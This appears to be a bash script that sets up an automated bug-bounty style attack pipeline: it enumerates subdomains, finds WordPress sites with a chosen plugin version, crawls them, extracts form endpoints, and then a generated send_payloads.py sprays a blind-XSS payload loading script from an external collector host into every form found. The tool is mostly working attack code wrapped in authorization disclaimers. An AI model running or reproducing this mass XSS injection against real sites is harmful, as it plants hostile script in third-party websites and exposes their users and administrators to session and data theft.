#!/usr/bin/env bash
# recon-pipeline-setup.sh
# One-shot installer + pipeline scaffold for recon -> detection -> crawl -> blind-xss delivery
# Target: Ubuntu 22.04+ (tested)
# WARNING: Use only on targets you are authorized to test (bug bounty programs / pentest scope).

set -euo pipefail
WORKDIR="$HOME/recon_pipeline"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

echo "Creating pipeline scaffold in: $WORKDIR"

cat > install_deps.sh <<'BASH'
#!/usr/bin/env bash
set -euo pipefail
# Install system deps
sudo apt update && sudo apt upgrade -y
sudo apt install -y git curl wget unzip python3 python3-pip build-essential nginx certbot jq

# Install Go (if not present)
if ! command -v go >/dev/null 2>&1; then
  echo "Installing Go..."
  GOVERSION="1.22.0"
  wget -q https://go.dev/dl/go${GOVERSION}.linux-amd64.tar.gz -O /tmp/go.tar.gz
  sudo tar -C /usr/local -xzf /tmp/go.tar.gz
  echo 'export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin' >> "$HOME/.bashrc"
  export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin
fi

# Install ProjectDiscovery tools
echo "Installing subfinder, httpx, nuclei, katana..."
export GOPATH="$HOME/go"
export PATH=$PATH:$GOPATH/bin

# use -u latest so it's the most recent release
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest

# Python deps
python3 -m pip install --user requests beautifulsoup4 tqdm

# Optional: clone ezXSS (lightweight XSS catcher)
if [ ! -d "$HOME/ezXSS" ]; then
  git clone https://github.com/ssl/ezXSS "$HOME/ezXSS"
  echo "ezXSS cloned to $HOME/ezXSS — configure and run it manually (see README)"
fi

echo "Dependencies installed."
BASH

cat > pipeline.sh <<'BASH'
#!/usr/bin/env bash
# pipeline.sh
# Usage: ./pipeline.sh programs.txt
set -euo pipefail

if [ "$#" -lt 1 ]; then
  echo "Usage: $0 programs.txt"
  exit 1
fi

PROGRAMS="$1"
WORKDIR="$(pwd)"
OUTDIR="$WORKDIR/out"
mkdir -p "$OUTDIR"

##############################################################
# STEP 1 — Subdomain Enumeration
##############################################################
echo "[1/6] Running subfinder..."
subfinder -dL "$PROGRAMS" -all -silent -o "$OUTDIR/subs.txt"

##############################################################
# STEP 2 — httpx: Alive Hosts Only
##############################################################
echo "[2/6] Running httpx on discovered subdomains..."
httpx -l "$OUTDIR/subs.txt" \
     -silent \
     -mc 200,301,302,307,308 \
     -o "$OUTDIR/live.txt"

echo "[*] Alive hosts: $(wc -l < $OUTDIR/live.txt)"

##############################################################
# STEP 3 — WordPress Detection using Nuclei
##############################################################
echo "[3/6] Running nuclei WordPress detection..."

if [ ! -f templates/wordpress-detect.yaml ]; then
  echo "ERROR: Missing templates/wordpress-detect.yaml — create it first."
  exit 1
fi

nuclei -t templates/wordpress-detect.yaml \
       -l "$OUTDIR/live.txt" \
       -silent \
       -o "$OUTDIR/wp_detected_raw.txt" || true

# Extract unique URLs only
cut -d ' ' -f1 "$OUTDIR/wp_detected_raw.txt" | sort -u > "$OUTDIR/wp_hosts.txt"

echo "[*] WordPress hosts identified: $(wc -l < $OUTDIR/wp_hosts.txt)"

##############################################################
# STEP 4 — Plugin / Version Detection via Custom Template
##############################################################
echo "[4/6] Running nuclei plugin detection..."

if [ ! -f templates/plugin-version.yaml ]; then
  echo "Missing templates/plugin-version.yaml — add your plugin template."
else
  nuclei -t templates/plugin-version.yaml \
         -l "$OUTDIR/wp_hosts.txt" \
         -silent \
         -o "$OUTDIR/vuln_plugin.txt" || true
fi

##############################################################
# STEP 5 — Crawl Vulnerable Hosts with Katana
##############################################################
echo "[5/6] Crawling vulnerable hosts..."

mkdir -p "$OUTDIR/katana_pages"

if [ -s "$OUTDIR/vuln_plugin.txt" ]; then
  cut -d ' ' -f1 "$OUTDIR/vuln_plugin.txt" | sort -u > "$OUTDIR/vuln_hosts.txt"

  while read -r host; do
    echo "Crawling $host"
    katana -u "$host" -depth 3 -silent -o "$OUTDIR/katana_pages/$(echo "$host" | sed 's#https://##;s#http://##').txt" || true
  done < "$OUTDIR/vuln_hosts.txt"
else
  echo "No vulnerable hosts found — skipping katana."
fi

##############################################################
# STEP 6 — Extract Form Endpoints
##############################################################
echo "[6/6] Extracting forms..."

python3 - <<'PY'
from bs4 import BeautifulSoup
import glob

forms=set()

for f in glob.glob('out/katana_pages/*.txt'):
    try:
        txt=open(f,'r',errors='ignore').read()
    except:
        continue

    soup = BeautifulSoup(txt, 'html.parser')

    for form in soup.find_all('form'):
        action = form.get('action', '').strip()
        if action.startswith('http'):
            forms.add(action)
        elif action.startswith('/'):
            host = f.split('/')[-1].replace('.txt','')
            forms.add('https://' + host + action)

open('out/forms.txt','w').write("\n".join(sorted(forms)))
print("Forms extracted:", len(forms))
PY

echo "Pipeline complete. Output saved in: $OUTDIR"
BASH

cat > send_payloads.py <<'PY'
#!/usr/bin/env python3
"""
send_payloads.py
Reads out/forms.txt and posts a payload to the endpoints found.
Configure YOUR_XSS_DOMAIN variable below to your collector.
WARNING: Only test authorized targets.
"""
import requests
from urllib.parse import urlparse
from tqdm import tqdm

YOUR_XSS_DOMAIN = "your-xss-domain.example"  # <-- SET THIS before running
# A simple payload; using <script src=...> style so it triggers an external request
payload_template = '<script src="https://{domain}/p.js?u={token}"></script>'

forms_file = 'out/forms.txt'
if __name__ == '__main__':
    with open(forms_file) as f:
        forms = [l.strip() for l in f if l.strip()]
    print(f'Loaded {len(forms)} form endpoints')
    for i, form in enumerate(forms):
        try:
            token = f't{str(i)}'
            payload = payload_template.format(domain=YOUR_XSS_DOMAIN, token=token)
            # naive POST attempt, common form fields
            data = {'name':'recon','email':'recon@example.com','message':payload}
            print('->',form)
            try:
                r = requests.post(form, data=data, timeout=12, allow_redirects=True)
                print('  status',r.status_code)
            except Exception as e:
                # try GET param injection
                try:
                    r = requests.get(form, params={'q':payload}, timeout=12)
                    print('  status(GET)',r.status_code)
                except Exception as e2:
                    print('  failed:',e2)
        except Exception as e:
            print('error sending to', form, e)
PY

cat > templates/plugin-version.yaml <<'YAML'
id: wordpress-detect-plugin-version
info:
  name: WP plugin/version detection (example)
  author: recon-pipeline
  severity: info

requests:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/yourplugin/readme.txt"
      - "{{BaseURL}}/wp-content/plugins/yourplugin/style.css"
      - "{{BaseURL}}/wp-content/plugins/yourplugin/changelog.txt"
    matchers:
      - type: word
        words:
          - "Stable tag:"
          - "Version"
        part: body
YAML

chmod +x install_deps.sh pipeline.sh send_payloads.py

cat > README.md <<'MD'
# Recon Pipeline (scaffold)

Files created:
 - install_deps.sh  : install system deps + PD tools
 - pipeline.sh      : main pipeline. Usage: ./pipeline.sh programs.txt
 - send_payloads.py : naive payload sender; set YOUR_XSS_DOMAIN inside
 - templates/plugin-version.yaml : example nuclei template
 - out/              : pipeline outputs

Quick start:
 1. Edit templates/plugin-version.yaml to detect your specific plugin/version.
 2. Put your programs list in programs.txt (one program domain per line).
 3. Run: ./install_deps.sh
 4. Run: ./pipeline.sh programs.txt
 5. Configure your XSS catcher (ezXSS or xsshunter) and set YOUR_XSS_DOMAIN in send_payloads.py
 6. Run: python3 send_payloads.py

LEGAL: Only test targets you are authorized to test (bug bounty program in-scope assets / pentest scope).
MD

echo "Scaffold created. Run ./install_deps.sh then ./pipeline.sh programs.txt"
